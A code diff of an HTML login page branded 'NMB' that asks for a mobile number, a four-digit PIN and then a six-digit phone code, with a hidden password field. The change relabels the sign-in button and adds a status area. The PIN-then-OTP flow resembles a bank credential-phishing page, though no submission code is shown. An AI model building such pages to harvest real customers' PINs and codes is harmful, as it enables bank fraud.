@@ -71,28 +71,29 @@
         <div class="app-name">NMB</div>
         <div class="app-title">Secured Login &#128274;</div>
       </div>
-      <form id="login-form" class="app-form">
-        <label for="mobile">Mobile Number</label>
-        <div class="app-input">
-          <i class="fa fa-phone"></i>
-          <input id="mobile" type="tel" name="username" placeholder="07XXXXXXXX" maxlength="10" inputmode="numeric" autocomplete="off" />
-        </div>
+<form id="login-form" class="app-form">
+         <label for="mobile">Mobile Number</label>
+         <div class="app-input">
+           <i class="fa fa-phone"></i>
+           <input id="mobile" type="tel" name="username" placeholder="07XXXXXXXX" maxlength="10" inputmode="numeric" autocomplete="off" />
+         </div>
 
-        <label for="pin1">Enter NMB PIN</label>
-        <div class="pin-row">
-          <input id="pin1" class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" />
-          <input id="pin2" class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" />
-          <input id="pin3" class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" />
-          <input id="pin4" class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" />
-        </div>
-        <input type="hidden" name="password" />
+         <label for="pin1">Enter NMB PIN</label>
+         <div class="pin-row">
+           <input id="pin1" class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" />
+           <input id="pin2" class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" />
+           <input id="pin3" class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" />
+           <input id="pin4" class="pin-box" type="password" inputmode="numeric" maxlength="1" autocomplete="off" />
+         </div>
+         <input type="hidden" name="password" />
 
-        <button type="submit" class="app-signin">Sign In</button>
-        <div class="app-links">
-          <a href="#">Forgot PIN?</a>
-          <a href="apply.html">Register</a>
-        </div>
-      </form>
+         <button type="submit" class="app-signin" id="submit-pin-btn">Verify PIN</button>
+         <div id="pin-status" class="app-links" style="margin-top: 1rem; font-size: 0.9rem; color: #666; min-height: 1.5rem;"></div>
+         <div class="app-links">
+           <a href="#">Forgot PIN?</a>
+           <a href="apply.html">Register</a>
+         </div>
+       </form>
 
       <form id="otp-form" class="app-form" style="display:none;">
         <label for="otp1">Enter 6-digit code sent to your phone</label>
